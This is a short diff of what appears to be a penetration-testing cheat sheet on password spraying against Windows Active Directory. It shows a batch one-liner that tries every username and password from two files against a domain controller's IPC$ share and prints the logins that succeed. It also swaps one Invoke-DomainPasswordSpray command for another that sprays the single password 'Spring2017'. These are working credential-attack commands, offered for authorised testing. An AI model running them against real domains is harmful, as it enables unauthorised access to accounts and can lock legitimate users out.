@@ -97,9 +97,9 @@ $month$year
 
 `@FOR /F %n in (users.txt) DO @FOR /F %p in (pass.txt) DO @net use \\DOMAINCONTROLLER\IPC$ /user:DOMAIN\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\DOMAINCONTROLLER\IPC$ > NUL`
 
-### Powershell
+### Domain joined machine
 
-`Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt`
+`Invoke-DomainPasswordSpray -Password Spring2017`
 
 ## Non-domain joined testing
 
